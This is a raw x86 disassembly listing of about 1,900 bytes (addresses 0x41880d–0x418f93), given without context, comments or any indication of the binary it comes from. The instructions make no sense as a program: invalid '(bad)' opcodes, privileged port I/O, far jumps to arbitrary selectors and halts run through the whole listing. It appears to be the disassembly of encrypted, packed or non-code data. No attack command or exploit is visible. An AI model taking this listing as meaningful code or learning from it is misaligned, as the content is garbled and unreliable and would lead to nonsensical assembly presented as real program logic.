  41880d:	lods   eax,DWORD PTR ds:[esi]
  41880e:	sar    bl,0xb4
  418811:	mov    al,0x8d
  418813:	sahf   
  418814:	adc    al,0x10
  418816:	cwde   
  418817:	pop    ebx
  418818:	mov    bh,0x1a
  41881a:	lock mov edi,DWORD PTR [ecx+edx*2+0x207464ea]
  418822:	fcmovu st,st(4)
  418824:	add    eax,0x2743851f
  418829:	or     al,0x3a
  41882b:	call   0x3e74:0xe56c504a
  418832:	jmp    0x71eadae9
  418837:	ins    BYTE PTR es:[edi],dx
  418838:	shr    BYTE PTR [ebx+0x7f0a887b],1
  41883e:	icebp  
  41883f:	fucomip st,st(6)
  418841:	push   ds
  418842:	pop    ebp
  418843:	mov    ch,0xb9
  418845:	and    eax,0xc7ab643c
  41884a:	cmp    dl,BYTE PTR [ebx]
  41884c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41884d:	sbb    eax,0x4fa7c8cb
  418852:	fldcw  WORD PTR [esi+0x384a58eb]
  418858:	sub    al,0x56
  41885a:	dec    eax
  41885b:	popa   
  41885c:	jnp    0x41881f
  41885e:	pop    ss
  41885f:	mov    ds:0x2d4b7112,al
  418864:	inc    edx
  418865:	test   al,0x8d
  418867:	icebp  
  418868:	jmp    0xbf89:0x2f3ed80a
  41886f:	aad    0xfd
  418871:	pmuludq mm7,QWORD PTR [ebp-0x3e70f16]
  418878:	sti    
  418879:	stc    
  41887a:	mov    ecx,DWORD PTR [edx+0x4562fff0]
  418880:	or     DWORD PTR [edi-0x1d65c4da],esp
  418886:	cmp    edi,eax
  418888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418889:	mov    eax,eax
  41888b:	ss loop 0x418895
  41888e:	add    ebp,DWORD PTR [eax+ebp*2]
  418891:	inc    esi
  418892:	pop    ebx
  418893:	or     DWORD PTR [esi-0x26f56e37],0x816aaad1
  41889d:	push   cs
  41889e:	scas   al,BYTE PTR es:[edi]
  41889f:	les    edi,FWORD PTR [edx+0x2d9a24de]
  4188a5:	leave  
  4188a6:	int3   
  4188a7:	jns    0x4188cd
  4188a9:	test   BYTE PTR [eax-0x27],al
  4188ac:	xor    al,0x81
  4188ae:	add    DWORD PTR [edx],ebx
  4188b0:	dec    esp
  4188b1:	clc    
  4188b2:	fsubr  DWORD PTR [edi+0x4aad148c]
  4188b8:	dec    esp
  4188b9:	inc    edx
  4188ba:	or     al,0x23
  4188bc:	out    0x98,al
  4188be:	ins    DWORD PTR es:[edi],dx
  4188bf:	dec    ecx
  4188c0:	in     al,dx
  4188c1:	ret    
  4188c2:	stc    
  4188c3:	test   eax,edx
  4188c5:	outs   dx,BYTE PTR ds:[esi]
  4188c6:	pop    ss
  4188c7:	loopne 0x418947
  4188c9:	pop    eax
  4188ca:	nop
  4188cb:	or     ebx,DWORD PTR [eax+0x0]
  4188d1:	add    BYTE PTR [esi-0x8290893],bl
  4188d7:	fidivr WORD PTR [edi-0x61f42993]
  4188dd:	int    0x6d
  4188df:	inc    edx
  4188e0:	sbb    eax,DWORD PTR [ebx+0x105f7]
  4188e6:	repz add al,0x0
  4188e9:	add    BYTE PTR [ebx-0x5768f6a1],cl
  4188ef:	shl    BYTE PTR [edi+0x3a16cc01],1
  4188f5:	imul   edx,DWORD PTR [esi],0x27
  4188f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f9:	out    dx,al
  4188fa:	js     0x418921
  4188fc:	jecxz  0x41895e
  4188fe:	jmp    0x83ac60bf
  418903:	push   ebx
  418904:	mov    ebx,0xbd659de3
  418909:	inc    edx
  41890a:	push   cs
  41890b:	in     al,dx
  41890c:	sub    dh,BYTE PTR [eax+ebx*2]
  41890f:	icebp  
  418910:	dec    ebp
  418911:	mov    ds:0xe18c01f8,eax
  418916:	dec    eax
  418917:	pop    ebp
  418918:	fmulp  st(3),st
  41891a:	sbb    BYTE PTR [ebx],0x4
  41891d:	fnsave [edi-0x6e]
  418920:	xor    dl,0x68
  418923:	(bad)  
  418925:	dec    ebp
  418926:	jl     0x418988
  418928:	mov    bh,0x39
  41892a:	sub    al,0xe2
  41892c:	xor    ch,BYTE PTR [ebx+0x55]
  41892f:	dec    edi
  418930:	cmp    al,0x9
  418932:	pusha  
  418933:	fcom   QWORD PTR [eax]
  418935:	xchg   esi,eax
  418936:	mov    ds:0xa1ff4a0c,al
  41893b:	mov    eax,0xcc47a3e5
  418940:	sub    eax,0xdb115b55
  418945:	arpl   bp,ax
  418947:	jne    0x4188e0
  418949:	jmp    0x418908
  41894b:	mov    ebp,0x20f0f979
  418950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418951:	(bad)  
  418952:	mov    dl,0x70
  418954:	out    dx,eax
  418955:	inc    ecx
  418956:	call   0x1061:0x5ed6ee0d
  41895d:	icebp  
  41895e:	pushf  
  41895f:	fisubr WORD PTR ds:0xbee22f2f
  418965:	sub    DWORD PTR [ebp+0x1dfbc764],ecx
  41896b:	pop    ebx
  41896c:	mov    dh,0x34
  41896e:	test   BYTE PTR [edi+0x7a],bh
  418971:	mov    edx,0xed546513
  418976:	mov    WORD PTR [ecx],?
  418978:	out    dx,al
  418979:	adc    DWORD PTR [edx],edi
  41897b:	xchg   esp,eax
  41897c:	xchg   esi,eax
  41897d:	and    DWORD PTR [esi],esi
  41897f:	pop    edx
  418980:	push   cs
  418981:	sahf   
  418982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418983:	inc    edi
  418984:	push   ds
  418985:	(bad)  
  418987:	sub    eax,0xdd8ddf3f
  41898c:	xor    al,0xe5
  41898e:	jnp    0x41894c
  418990:	aam    0x36
  418992:	pop    ss
  418993:	or     ah,ch
  418995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418996:	mov    dh,0x29
  418998:	pop    edx
  418999:	inc    esp
  41899a:	data16 adc al,0x1f
  41899d:	(bad)
  4189a0:	aam    0x23
  4189a2:	xchg   ebx,eax
  4189a3:	cmp    al,ch
  4189a5:	pop    ecx
  4189a6:	inc    ebx
  4189a7:	mov    ch,bh
  4189a9:	add    bl,ah
  4189ab:	ret    0xb543
  4189ae:	push   ss
  4189af:	push   0x73
  4189b1:	rol    BYTE PTR es:[ebp+ebx*2-0x12],0x85
  4189b7:	into   
  4189b8:	repnz inc ebp
  4189ba:	add    ah,dl
  4189bc:	jmp    0xd8417b18
  4189c1:	lea    edi,[edi-0x64]
  4189c4:	shl    BYTE PTR [eax-0x13df7696],0xb5
  4189cb:	aam    0x5d
  4189cd:	ficom  WORD PTR [edi-0x3d]
  4189d0:	cmovb  edx,DWORD PTR [ebp+0x56]
  4189d4:	mov    edi,ecx
  4189d6:	std    
  4189d7:	sub    eax,0x666263f0
  4189dc:	xchg   esp,eax
  4189dd:	frstor [ebx]
  4189df:	sub    ch,BYTE PTR [edx-0x34532c5f]
  4189e5:	repz loop 0x418a33
  4189e8:	xor    bl,dh
  4189ea:	mov    eax,0x4b2f27ea
  4189ef:	sbb    eax,0xf468978c
  4189f4:	addr16 stc 
  4189f6:	inc    esp
  4189f7:	and    BYTE PTR [ebx],0xad
  4189fa:	and    BYTE PTR [edi],ch
  4189fc:	out    0x53,eax
  4189fe:	je     0x4189a8
  418a00:	stos   DWORD PTR es:[edi],eax
  418a01:	(bad)  
  418a02:	mov    ds,WORD PTR [ecx+0x40e63da7]
  418a08:	or     BYTE PTR [ebp+0x18662096],dh
  418a0e:	push   edi
  418a0f:	jge    0x418a0f
  418a11:	jle    0x4189a9
  418a13:	(bad)  
  418a14:	fild   WORD PTR [esi-0x29]
  418a17:	nop
  418a18:	rcr    esi,1
  418a1a:	pop    ss
  418a1b:	retf   
  418a1c:	bound  edi,QWORD PTR [edx+0x3acf2a1]
  418a22:	inc    ebp
  418a23:	mov    WORD PTR [ebp+0x3b],fs
  418a26:	xchg   edx,eax
  418a27:	inc    esp
  418a28:	and    ch,bh
  418a2a:	inc    edx
  418a2b:	retf   
  418a2c:	cs xchg ecx,eax
  418a2e:	ins    BYTE PTR es:[edi],dx
  418a2f:	cwde   
  418a30:	cld    
  418a31:	loope  0x418a01
  418a33:	dec    eax
  418a34:	mov    ah,0xcb
  418a36:	push   ecx
  418a37:	pop    esi
  418a38:	sbb    bh,BYTE PTR [edi-0x4a0c1312]
  418a3e:	inc    edi
  418a3f:	out    dx,al
  418a40:	cs jno 0x4189ed
  418a43:	adc    al,0xac
  418a45:	jae    0x418a7e
  418a47:	add    cl,BYTE PTR [esi+0x744e8dff]
  418a4d:	and    ecx,0xffffff89
  418a50:	inc    esi
  418a51:	cmp    esi,DWORD PTR [ebx+eiz*2-0x14]
  418a55:	pop    ds
  418a56:	ror    DWORD PTR [ecx-0x2a],cl
  418a59:	dec    esi
  418a5a:	out    dx,al
  418a5b:	sbb    eax,0xf55fd3dc
  418a60:	pop    eax
  418a61:	adc    ebp,ebx
  418a63:	or     al,0xda
  418a65:	pop    edx
  418a66:	sub    eax,DWORD PTR [esi-0x46c1d206]
  418a6c:	mov    cl,0x65
  418a6e:	sbb    BYTE PTR ds:[eax],al
  418a71:	xchg   ebp,eax
  418a72:	out    0x41,al
  418a74:	outs   dx,BYTE PTR ds:[esi]
  418a75:	mov    ah,0xe3
  418a77:	xchg   esi,eax
  418a78:	pop    ecx
  418a79:	pop    esp
  418a7a:	stc    
  418a7b:	inc    ecx
  418a7c:	adc    edi,0xfffffff6
  418a7f:	stos   DWORD PTR es:[edi],eax
  418a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a81:	inc    ecx
  418a82:	je     0x418a18
  418a84:	mov    dh,0x31
  418a86:	mov    al,0x29
  418a88:	mov    eax,ds:0xf2cd9862
  418a8d:	cmp    DWORD PTR [ebp+ebp*4-0x12c3d41d],0x42
  418a95:	ja     0x418a99
  418a97:	bound  esp,QWORD PTR ds:0xb2b00e76
  418a9d:	call   0x8d5d:0xe4cb9705
  418aa4:	push   ebp
  418aa5:	loopne 0x418aa2
  418aa7:	mov    WORD PTR [edi-0x39ba5c1f],cs
  418aad:	addr16 icebp 
  418aaf:	cmc    
  418ab0:	fimul  DWORD PTR [edx+0x5f]
  418ab3:	adc    eax,0x60332eb0
  418ab8:	dec    esp
  418ab9:	cmp    esp,ebx
  418abb:	popa   
  418abc:	cld    
  418abd:	pop    es
  418abe:	add    BYTE PTR [edx-0x52],dl
  418ac1:	cmp    DWORD PTR [edi+0xd],edi
  418ac4:	mov    DWORD PTR [edx+eax*1-0x36292d9b],eax
  418acb:	mov    cl,0xc7
  418acd:	jecxz  0x418adc
  418acf:	iret   
  418ad0:	jecxz  0x418af4
  418ad2:	pop    es
  418ad3:	xchg   edx,eax
  418ad4:	pop    ebx
  418ad5:	pushf  
  418ad6:	aam    0xe7
  418ad8:	xchg   edi,eax
  418ad9:	test   BYTE PTR [ebp-0x264a93d1],0x7a
  418ae0:	cmp    al,ah
  418ae2:	(bad)  [edi-0x7d2ffd99]
  418ae8:	lods   al,BYTE PTR ds:[esi]
  418ae9:	pop    ebx
  418aea:	loop   0x418aea
  418aec:	pmovmskb esp,mm1
  418aef:	add    bh,BYTE PTR [ebx]
  418af1:	sub    bh,BYTE PTR [eax]
  418af3:	mov    esi,0xdb03e1d5
  418af8:	xor    DWORD PTR [ebx+0x4f865c7c],0xd4b2ec38
  418b02:	dec    eax
  418b03:	mov    ds:0xf4352f82,al
  418b08:	lahf   
  418b09:	sbb    DWORD PTR [edx-0x75670850],0xc9b0646
  418b13:	shl    DWORD PTR [esi+edx*8],cl
  418b16:	in     eax,dx
  418b17:	les    esp,FWORD PTR [edi+0x1]
  418b1a:	test   DWORD PTR [esp+ebp*8],esp
  418b1d:	cwd    
  418b1f:	pop    ecx
  418b20:	jmp    0xf77a:0xd0058fa5
  418b27:	mov    eax,0x530a3044
  418b2c:	fwait
  418b2d:	and    esp,DWORD PTR [ebx+esi*2+0x2f]
  418b31:	jno    0x418b4f
  418b33:	outs   dx,DWORD PTR ds:[esi]
  418b34:	(bad)  
  418b35:	into   
  418b36:	in     al,0xf7
  418b38:	ins    BYTE PTR es:[edi],dx
  418b39:	xchg   edx,eax
  418b3a:	fiadd  DWORD PTR [ebp+eax*1-0x3c]
  418b3e:	inc    esp
  418b3f:	fld    QWORD PTR [ecx+0x65]
  418b42:	inc    ebp
  418b43:	xchg   ebx,eax
  418b44:	push   cs
  418b45:	test   esi,eax
  418b47:	and    DWORD PTR [eax],eax
  418b49:	retf   0x9b66
  418b4c:	adc    DWORD PTR [edi-0x31],ebp
  418b4f:	xor    ch,dl
  418b51:	xchg   edi,esi
  418b53:	sub    al,0xa5
  418b55:	test   BYTE PTR [esi],ch
  418b57:	es adc dh,dh
  418b5a:	jno    0x418afa
  418b5c:	or     DWORD PTR [ebx],esi
  418b5e:	pop    esi
  418b5f:	sub    al,0xd6
  418b62:	jmp    0xdef3:0xbd4a6c58
  418b69:	mov    dl,0x49
  418b6b:	imul   dh
  418b6d:	jg     0x418bd9
  418b6f:	aas    
  418b70:	sub    dl,bh
  418b72:	pop    ebx
  418b73:	div    DWORD PTR [edi+0x65]
  418b76:	mov    WORD PTR [ecx+0x4],ds
  418b79:	jp     0x418b26
  418b7b:	imul   ebx,DWORD PTR [eax],0xf4ac8561
  418b81:	cmp    ecx,0x8db75b56
  418b87:	cmp    ebp,ecx
  418b89:	push   es
  418b8a:	or     al,0x45
  418b8c:	ret    
  418b8d:	lea    edi,[eax-0x493158b9]
  418b93:	bt     DWORD PTR [ecx-0x53],ebp
  418b97:	neg    ah
  418b99:	lds    esi,FWORD PTR [edi-0x3d]
  418b9c:	bound  esp,QWORD PTR [edi+ecx*8-0x4e5f13d9]
  418ba3:	stos   BYTE PTR es:[edi],al
  418ba4:	test   al,0x52
  418ba6:	adc    ah,dl
  418ba8:	cwde   
  418ba9:	arpl   WORD PTR [ebp+0x7],sp
  418bac:	fwait
  418bad:	mov    esp,0x121008b4
  418bb2:	xor    dl,ch
  418bb4:	nop
  418bb5:	or     BYTE PTR [edx-0x607cdbc8],dl
  418bbb:	sbb    cl,ch
  418bbd:	inc    ecx
  418bbe:	leave  
  418bbf:	mov    WORD PTR [eax+0x443d967a],fs
  418bc5:	dec    esi
  418bc6:	call   0xc105:0x1811a416
  418bcd:	lahf   
  418bce:	sahf   
  418bcf:	mov    al,dl
  418bd1:	cmp    dh,BYTE PTR [ebx-0x2b8c291a]
  418bd7:	test   eax,0x30e7147d
  418bdc:	cwde   
  418bdd:	cmp    edx,DWORD PTR [ebp+0x106e95f9]
  418be3:	arpl   cx,bx
  418be5:	ret    0x1ed6
  418be8:	jmp    0xadbd:0x9eb605b1
  418bef:	ret    0xcde7
  418bf2:	out    dx,eax
  418bf3:	and    eax,0x73fcfb4
  418bf8:	(bad)  
  418bf9:	jb     0x418bd9
  418bfb:	ja     0x418c74
  418bfd:	ins    BYTE PTR es:[edi],dx
  418bfe:	jns    0x418bd4
  418c00:	call   0x4992faad
  418c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c06:	jno    0x418bbd
  418c08:	or     DWORD PTR [ecx-0x4176a187],edi
  418c0e:	ss pushf 
  418c10:	or     DWORD PTR [ecx-0x48ce3efa],ecx
  418c16:	dec    esi
  418c17:	cmc    
  418c18:	jmp    0xf189cd37
  418c1d:	cmp    ebp,DWORD PTR [edi]
  418c1f:	inc    ebp
  418c20:	add    BYTE PTR [edi+eiz*8-0x591e80ff],0x6f
  418c28:	sub    eax,ecx
  418c2a:	dec    ecx
  418c2b:	pop    esp
  418c2c:	dec    ebp
  418c2d:	inc    esi
  418c2e:	int3   
  418c2f:	inc    eax
  418c30:	aas    
  418c31:	jbe    0x418c06
  418c33:	sbb    eax,DWORD PTR [edi+ecx*4-0x35472a4]
  418c3a:	push   ebp
  418c3b:	outs   dx,DWORD PTR ds:[esi]
  418c3c:	lods   eax,DWORD PTR ds:[esi]
  418c3d:	pop    ebp
  418c3e:	ins    DWORD PTR es:[edi],dx
  418c3f:	pushf  
  418c40:	aam    0xdc
  418c42:	adc    eax,0xbfc10278
  418c47:	and    ebx,edi
  418c49:	pop    ecx
  418c4a:	sbb    eax,0xd022813c
  418c4f:	sub    dl,BYTE PTR [eax-0x2e]
  418c52:	xchg   esi,eax
  418c53:	pushf  
  418c54:	xor    ecx,DWORD PTR [ebx]
  418c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c57:	mov    al,0xa5
  418c59:	xchg   edx,eax
  418c5a:	jnp    0x418c57
  418c5c:	lahf   
  418c5d:	push   edi
  418c5e:	sub    esp,esp
  418c60:	xor    al,0x7
  418c62:	xlat   BYTE PTR ds:[ebx]
  418c63:	in     al,dx
  418c64:	das    
  418c65:	daa    
  418c66:	xchg   ebx,eax
  418c67:	or     eax,0x20a91e1a
  418c6c:	jne    0x418c84
  418c6e:	push   esi
  418c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c70:	faddp  st(7),st
  418c72:	xchg   edx,eax
  418c73:	dec    ebp
  418c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c75:	dec    esp
  418c76:	jns    0x418ca5
  418c78:	call   0x9d97:0xaf30ac98
  418c7f:	mov    ecx,0x1338475d
  418c84:	pop    esi
  418c85:	std    
  418c86:	test   al,0x74
  418c88:	sbb    ah,BYTE PTR [edx+0x5304d0ac]
  418c8e:	fst    st(6)
  418c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c91:	mov    esi,0xb4af7cdc
  418c96:	mov    dl,0x80
  418c98:	stos   DWORD PTR es:[edi],eax
  418c99:	pusha  
  418c9a:	add    edx,esp
  418c9c:	mov    dh,0x42
  418c9e:	push   ebx
  418c9f:	(bad)  
  418ca1:	ret    0xb629
  418ca4:	es in  eax,dx
  418ca6:	push   ss
  418ca7:	cli    
  418ca8:	clc    
  418ca9:	in     eax,dx
  418caa:	ror    DWORD PTR [ebx-0x1d],cl
  418cad:	clc    
  418cae:	jmp    0xae96:0xd09c47df
  418cb5:	mov    eax,ds:0xcdc474f3
  418cba:	lahf   
  418cbb:	lods   eax,DWORD PTR ds:[esi]
  418cbc:	ret    0xccc8
  418cbf:	ss or  eax,0x3df623b5
  418cc5:	ss add esp,DWORD PTR ss:[eax-0x5c]
  418cca:	rcl    edx,cl
  418ccc:	mov    bh,0xd
  418cce:	inc    edx
  418ccf:	push   esi
  418cd0:	mov    dh,0x6c
  418cd2:	(bad)  
  418cd3:	fcomp  DWORD PTR [ecx]
  418cd5:	scas   eax,DWORD PTR es:[edi]
  418cd6:	push   ss
  418cd7:	push   ebx
  418cd8:	push   eax
  418cd9:	jp     0x418d0e
  418cdb:	pop    ebp
  418cdc:	fcmovbe st,st(4)
  418cde:	cmp    ebp,edi
  418ce0:	icebp  
  418ce1:	dec    edi
  418ce2:	mov    bl,0xe7
  418ce4:	push   0x77
  418ce6:	and    DWORD PTR [esi+0x2b5217a7],ebx
  418cec:	mov    dl,BYTE PTR [ebx+0x4b32f457]
  418cf2:	enter  0x31e3,0xba
  418cf6:	jae    0x418d59
  418cf8:	or     ebp,ecx
  418cfa:	xchg   ebx,eax
  418cfb:	rcl    DWORD PTR [esi+eiz*2+0x14],0x2c
  418d00:	or     edx,DWORD PTR [ecx-0x77]
  418d03:	and    al,BYTE PTR [ecx+0x49]
  418d06:	xchg   esp,eax
  418d07:	push   0x66af07d9
  418d0c:	not    BYTE PTR [eax+eax*4]
  418d0f:	dec    bh
  418d11:	jecxz  0x418cd4
  418d13:	inc    ebp
  418d14:	push   ebx
  418d15:	lods   eax,DWORD PTR ds:[esi]
  418d16:	xchg   ebp,eax
  418d17:	mov    esp,0xb78ecf7e
  418d1c:	out    0xb8,eax
  418d1e:	sbb    DWORD PTR [ebp+0x70427ef6],edi
  418d24:	inc    esi
  418d25:	mov    esi,0xc8d4137a
  418d2a:	pop    edi
  418d2b:	repz shl ebx,0x37
  418d2f:	push   ds
  418d30:	mov    BYTE PTR [eax],dl
  418d32:	pop    esp
  418d33:	idiv   DWORD PTR [esi]
  418d35:	ffree  st(4)
  418d37:	mov    bh,0xd0
  418d39:	or     al,0x78
  418d3b:	pop    ebp
  418d3c:	xchg   edi,eax
  418d3d:	mov    ecx,0xe99f666c
  418d42:	cs call 0x9295e98e
  418d48:	adc    edi,ebp
  418d4a:	bound  esp,QWORD PTR [ecx-0x11]
  418d4d:	or     edx,DWORD PTR [ecx]
  418d4f:	inc    edi
  418d50:	fidiv  DWORD PTR [eax+eax*4+0x69]
  418d54:	hlt    
  418d55:	cmp    DWORD PTR ds:0xfe5c712,esp
  418d5b:	cs (bad) 
  418d5d:	shl    esp,cl
  418d5f:	js     0x418d41
  418d61:	daa    
  418d62:	imul   ecx,DWORD PTR [ecx+0x7d],0xffffffe0
  418d66:	mov    bl,0xf8
  418d68:	test   BYTE PTR [esi+0x18],cl
  418d6b:	ins    BYTE PTR es:[edi],dx
  418d6c:	lods   al,BYTE PTR ds:[esi]
  418d6d:	imul   DWORD PTR [esi*2-0x7e1c6296]
  418d74:	test   al,0xa3
  418d76:	lods   al,BYTE PTR ds:[esi]
  418d77:	xchg   esi,eax
  418d78:	or     bl,ch
  418d7a:	inc    BYTE PTR ds:0x22d45a48
  418d80:	push   ds
  418d81:	or     dl,BYTE PTR [ecx+0x7057b98e]
  418d87:	dec    esp
  418d88:	adc    DWORD PTR [esi],edx
  418d8a:	push   eax
  418d8b:	lds    ecx,FWORD PTR es:[edx]
  418d8e:	stos   BYTE PTR es:[edi],al
  418d8f:	fist   DWORD PTR [eax-0x68]
  418d92:	xor    BYTE PTR [ebp-0x44e1767d],ch
  418d98:	adc    al,0x83
  418d9a:	jnp    0x418d92
  418d9c:	sub    BYTE PTR [ebx-0x59],ah
  418d9f:	je     0x418dee
  418da1:	and    BYTE PTR [eax+0x41],dh
  418da4:	popf   
  418da5:	jg     0x418db0
  418da7:	int3   
  418da8:	fcom   DWORD PTR es:[edi]
  418dab:	es (bad) 
  418dad:	fisub  WORD PTR ds:0x73d2dcf
  418db3:	adc    al,BYTE PTR [esi-0x4bd2f66d]
  418db9:	cmp    eax,0x82237c22
  418dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dbf:	inc    eax
  418dc0:	mov    DWORD PTR [edi+0x39],eax
  418dc3:	(bad)  
  418dc4:	fisttp WORD PTR [ebx]
  418dc6:	mov    DWORD PTR [edi+0x174ea749],edi
  418dcc:	jmp    0x418d55
  418dce:	leave  
  418dcf:	scas   al,BYTE PTR es:[edi]
  418dd0:	dec    ebx
  418dd1:	ficom  DWORD PTR [edi-0x494190c9]
  418dd7:	in     eax,dx
  418dd8:	jmp    0xfc6e707
  418ddd:	add    BYTE PTR [eax],al
  418ddf:	add    BYTE PTR [eax],al
  418de1:	add    BYTE PTR [edx-0x103695a9],dh
  418de7:	std    
  418de8:	mov    bl,0x7f
  418dea:	push   ebx
  418deb:	jg     0x418e10
  418ded:	mov    ecx,0x994ea04
  418df2:	jmp    0x4:0xf300010a
  418df9:	add    BYTE PTR [esi-0x6b0d0332],bl
  418dff:	outs   dx,DWORD PTR ds:[esi]
  418e00:	scas   al,BYTE PTR es:[edi]
  418e01:	xchg   esp,eax
  418e02:	push   ecx
  418e03:	das    
  418e04:	aad    0x4
  418e06:	arpl   WORD PTR [edi],dx
  418e08:	test   edx,0x90422795
  418e0e:	xchg   edi,eax
  418e0f:	les    esi,FWORD PTR [edi+0x44]
  418e12:	mov    edx,edi
  418e14:	loope  0x418e5b
  418e16:	push   ebp
  418e17:	rol    cl,cl
  418e19:	shr    DWORD PTR [edx-0x1c],cl
  418e1c:	sbb    BYTE PTR [edx+0xbf167b7],bh
  418e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e24:	push   eax
  418e25:	cmp    BYTE PTR [eax+0x6b],bl
  418e28:	jno    0x418dab
  418e2a:	dec    edi
  418e2b:	push   edi
  418e2c:	adc    esp,DWORD PTR [ebx-0x1eb490b]
  418e32:	out    0xb8,al
  418e34:	js     0x418e12
  418e36:	fwait
  418e37:	imul   edi,DWORD PTR [esi+0x316bcaf8],0xffffffb4
  418e3e:	adc    al,0xdc
  418e40:	sahf   
  418e41:	jae    0x418ddb
  418e43:	aas    
  418e44:	jne    0x418e49
  418e46:	mov    BYTE PTR [edx-0x2],ah
  418e49:	dec    edx
  418e4a:	xchg   esi,eax
  418e4b:	pop    esi
  418e4c:	stos   DWORD PTR es:[edi],eax
  418e4d:	(bad)  
  418e4e:	out    0xed,eax
  418e50:	aaa    
  418e51:	jne    0x418eaa
  418e53:	aas    
  418e54:	es stos DWORD PTR es:[edi],eax
  418e56:	mov    ds:0xe3c26486,eax
  418e5b:	xchg   ebx,eax
  418e5c:	in     eax,dx
  418e5d:	cmp    eax,0x7d397dd4
  418e62:	mov    DWORD PTR [edx+ebx*4],esi
  418e65:	or     ebx,ebx
  418e67:	cli    
  418e68:	mov    ebx,0x22e09600
  418e6d:	outs   dx,DWORD PTR ds:[esi]
  418e6e:	pop    ds
  418e6f:	pop    ecx
  418e70:	scas   al,BYTE PTR es:[edi]
  418e71:	dec    esi
  418e72:	mov    BYTE PTR ds:0xf1c07488,bh
  418e78:	lock and ebp,DWORD PTR [edx+0x3a]
  418e7c:	inc    esi
  418e7d:	add    esp,DWORD PTR [ecx+edx*1+0x54]
  418e81:	popa   
  418e82:	(bad)  
  418e83:	inc    ah
  418e85:	loopne 0x418e91
  418e87:	dec    ebx
  418e88:	scas   al,BYTE PTR es:[edi]
  418e89:	mov    dl,0x64
  418e8b:	test   BYTE PTR [edx-0x25],0x93
  418e8f:	sbb    esp,DWORD PTR [ecx*1-0x75f3d5c5]
  418e96:	imul   edx,DWORD PTR [ecx-0x770d1e31],0xffffff85
  418e9d:	stc    
  418e9e:	mov    ah,0xac
  418ea0:	jle    0x418e50
  418ea2:	icebp  
  418ea3:	dec    esi
  418ea4:	mov    esp,0xcea142a7
  418ea9:	push   0x9e210643
  418eae:	ss int3 
  418eb0:	in     al,dx
  418eb1:	mov    edi,0xb8023069
  418eb6:	cmp    al,0x71
  418eb8:	imul   DWORD PTR [eax]
  418eba:	mov    edi,0xf78ab86b
  418ebf:	dec    ecx
  418ec0:	call   0x3315:0x2ed9e079
  418ec7:	ins    DWORD PTR es:[edi],dx
  418ec8:	bound  esp,QWORD PTR [edi]
  418eca:	pop    es
  418ecb:	sub    esp,DWORD PTR [esi-0x2a30cb9b]
  418ed1:	push   ebx
  418ed2:	js     0x418e8e
  418ed4:	sbb    dl,BYTE PTR [ecx+ebx*1-0x3268e994]
  418edb:	mov    al,0xcd
  418edd:	or     al,0x1
  418edf:	adc    al,0xd5
  418ee1:	rcr    BYTE PTR [edx+eax*1+0x542409df],1
  418ee8:	addr16 inc ebp
  418eea:	push   esi
  418eeb:	inc    ebp
  418eec:	mov    es,WORD PTR [ebx]
  418eee:	shl    DWORD PTR [esi-0x33687e63],cl
  418ef4:	js     0x418e82
  418ef6:	xchg   ebp,eax
  418ef7:	inc    esp
  418ef8:	leave  
  418ef9:	mov    ds:0xc7ca17f2,al
  418efe:	in     al,dx
  418eff:	ins    BYTE PTR es:[edi],dx
  418f00:	xchg   DWORD PTR [ecx],edx
  418f02:	std    
  418f03:	mov    ebx,0x5a7f9b0d
  418f08:	mov    ah,0x46
  418f0a:	(bad)  
  418f0b:	out    dx,al
  418f0c:	xor    al,0x8c
  418f0e:	sub    esi,ecx
  418f10:	pop    edi
  418f11:	or     eax,esi
  418f13:	pop    edx
  418f14:	add    ah,BYTE PTR [esi-0x75]
  418f17:	xchg   ebx,eax
  418f18:	cmc    
  418f19:	and    bh,al
  418f1b:	(bad)  
  418f1c:	std    
  418f1d:	push   0xffffffb2
  418f1f:	enter  0x4500,0x2d
  418f23:	shl    DWORD PTR [eax],0x8e
  418f26:	xchg   esi,eax
  418f27:	cmp    al,0x83
  418f29:	mov    dl,0x34
  418f2b:	das    
  418f2c:	ins    DWORD PTR es:[edi],dx
  418f2d:	pop    ebx
  418f2e:	xor    al,0x61
  418f30:	and    ebx,DWORD PTR [esp+esi*4-0x4e]
  418f34:	mov    edi,0xe16f6253
  418f39:	add    ebp,edi
  418f3b:	int3   
  418f3c:	lock aas 
  418f3e:	push   esi
  418f3f:	sbb    bh,BYTE PTR ds:0xc3c7e6ad
  418f45:	xor    al,0xd2
  418f47:	xor    ebp,DWORD PTR fs:[esi-0x65]
  418f4b:	push   0xb0bbf195
  418f50:	rcr    dl,cl
  418f52:	dec    esp
  418f53:	sbb    eax,0x59ea6ce7
  418f58:	cld    
  418f59:	scas   al,BYTE PTR es:[edi]
  418f5a:	pop    edx
  418f5b:	ins    DWORD PTR es:[edi],dx
  418f5c:	mov    al,0x12
  418f5e:	xor    DWORD PTR [ecx],0x9
  418f61:	dec    esi
  418f62:	out    dx,eax
  418f63:	xor    dh,ah
  418f65:	gs push ds
  418f67:	ret    
  418f68:	cli    
  418f69:	sbb    ah,bh
  418f6b:	in     al,0x97
  418f6d:	jno    0x418f6b
  418f6f:	dec    esi
  418f70:	jmp    0x418fc7
  418f72:	mov    ebx,0x1603e67d
  418f77:	ins    BYTE PTR es:[edi],dx
  418f78:	loope  0x418f5d
  418f7a:	pop    ebx
  418f7b:	push   cs
  418f7c:	add    eax,0xde83bab
  418f81:	fcomp  DWORD PTR [eax]
  418f83:	(bad)  
  418f84:	xor    cl,BYTE PTR [ebx+0x3b]
  418f87:	push   ds
  418f88:	inc    edx
  418f89:	mov    WORD PTR [eax+0x137e243b],gs
  418f8f:	int3   
  418f90:	fistp  DWORD PTR [edx+0x7]
  418f93:	outs   dx,BYTE PTR ds:[esi]
